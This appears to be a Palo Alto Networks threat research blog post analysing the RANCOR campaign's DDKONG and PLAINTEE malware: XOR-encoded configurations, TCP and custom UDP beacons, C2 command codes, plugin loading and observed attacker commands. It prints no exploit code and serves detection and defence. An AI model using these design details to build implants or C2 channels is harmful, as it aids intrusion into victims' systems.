It is worth noting that the third DLL mentioned attempts to download the decoy document from a government website. This same website was used previously in a <a href="https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/">KHRat campaign targeting Cambodian citizens</a>.<br />
Additionally, two of the three DLL loaders were found to be hosted on this same compromised website, implying that it was likely compromised again in early 2018. The filenames for these two DLL loaders are as follows:</p>
<ul>

In all cases where we were able to identify the final payloads used, the DDKONG  or PLAINTEE malware families were used. We observed DDKONG in use between February 2017 and the present, while PLAINTEE is a newer addition with the earliest known sample being observed in October 2017. It’s unclear if DDKONG is only used by one threat actor or more than one based on the data available.<br />
In this section we’ll go over the capabilities and operation of these malware families.<br />
&nbsp;<br />
<strong>DDKONG</strong><br />
For the analysis below, we used the following file:<br />

<p style="text-align: center"><em>Table 1 – DDKONG sample analyzed in full.</em></p>
<p>&nbsp;<br />
The malware in question is configured with the following three exported functions:</p>
<ul>
<li>ServiceMain</li>
<li>Rundll32Call</li>
<li>DllEntryPoint</li>
</ul>
<p>The ServiceMain exported function indicates that this DLL is expected to be loaded as a service. If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe.<br />
The Rundll32Call exported function begins by creating a named event named ‘RunOnce’. This event ensures that only a single instance of DDKong is executed at a given time. If this is the only instance of DDKong running at the time, the malware continues. If it’s not, it dies. This ensures that only a single instance of DDKong is executed at a given time.<br />
DDKong attempts to decode an embedded configuration using a single byte XOR key of 0xC3. Once decoded, the configuration contains the data shown in Figure 5 below.<br />

<p style="text-align: center"><em>Figure 5 &#8211; Decoded configuration with fields highlighted</em></p>
<p>&nbsp;<br />
After this configuration is decoded and parsed, DDKONG proceeds to send a beacon to the configured remote server via a raw TCP connection. The packet has a header of length 32 and an optional payload. In the beacon, no payload is provided, and as such, the length of this packet is set to zero.<br />

<p style="text-align: center"><em>Figure 6 – DDKONG beacon to remote C2</em></p>
<p>&nbsp;<br />
After it sends the beacon, the malware expects a response command of either 0x4 or 0x6. Both responses instruct the malware to download and load a remote plugin. In the event 0x4 is specified, the malware is instructed to load the exported ‘InitAction’ function. If 0x6 is specified, the malware is instructed to load the exported ‘KernelDllCmdAction’ function. Prior to downloading the plugin, the malware downloads a buffer that is concatenated with the embedded configuration and ultimately provided to the plugin at runtime. An example of this buffer at runtime is below:<br />

In total we have been able to find six samples of PLAINTEE, which, based on our analysis, seems to be exclusively used by the RANCOR attackers. PLAINTEE is unusual in that it uses a custom UDP protocol for its network communications. For this walk through, we use the following sample:</p>

<p>Next, the malware calls the ‘Sub’ function which begins by spawning a mutex named ‘microsoftfuckedupb’ to ensure only a single instance is running at a given time. In addition, PLAINTEE will create a unique GUID via a call to CoCreateGuid() to be used as an identifier for the victim. The malware then proceeds to collect general system enumeration data about the infected machine and enters a loop where it will decode an embedded config blob and send an initial beacon to the C2 server.<br />
The configuration blob is encoded using a simple single-byte XOR scheme. The first byte of the string is used as the XOR key to in turn decode the remainder of the data.<br />
&nbsp;<br />
Decoding this blob yields the following information, also found within the original binary:<br />

The malware then proceeds to beacon to the configured port via a custom UDP protocol. The network traffic is encoded in a similar fashion, with a random byte being selected as the first byte, which is then used to decode the remainder of the packet via XOR.  An example of the decoded beacon is show in Figure 7.<br />

This beacon is continuously sent out until a valid response is obtained from the C2 server (there is no sleep timer set). After the initial beacon, there is a two second delay in between all other requests made. This response is expected to have a return command of 0x66660002 and to contain the same GUID that was sent to the C2 server. Once this response is received, the malware spawns several new threads, with different Command parameters, with the overall objective of loading and executing a new plugin that is to be received from the C2 server.</p>

PLAINTEE expects the downloaded plugin to be a DLL with an export function of either &#8216;shell&#8217; or &#8216;file&#8217;. The plugin uses the same network protocol as PLAINTEE and so we were able to trivially decode further commands that were sent.  The following commands were observed:</p>
<ul>
<li>tasklist</li>
<li>ipconfig /all</li>
</ul>
<p>The attacker performed these two commands 33 seconds apart. As automated commands are typically performed more quickly this indicates that they may have been sent manually by the attacker.<br />

<span style="font-size: 18pt">Conclusions</span><br />
The RANCOR campaign represents a continued trend of targeted attacks against entities within the South East Asia region. In a number of instances, politically motivated lures were used to entice victims into opening and subsequently loading previously undocumented malware families. These families made use of custom network communication to load and execute various plugins hosted by the attackers. Notably the PLAINTEE malwares’ use of a custom UDP protocol is rare and worth considering when building heuristics detections for unknown malware. Palo Alto Networks will continue to monitor these actors, their malware, and their infrastructure going forward.<br />
Palo Alto Networks customers are protected against the threats discussed in this blog in the following ways:</p>
<ul>
<li>Wildfire correctly identifies all samples discussed as malicious.</li>
<li>Traps appropriately blocks the malware from executing.</li>
<li>AutoFocus customers may track this threat via the KHRAT, DDKONG, PLAINTEE, and RANCOR tags.</li>
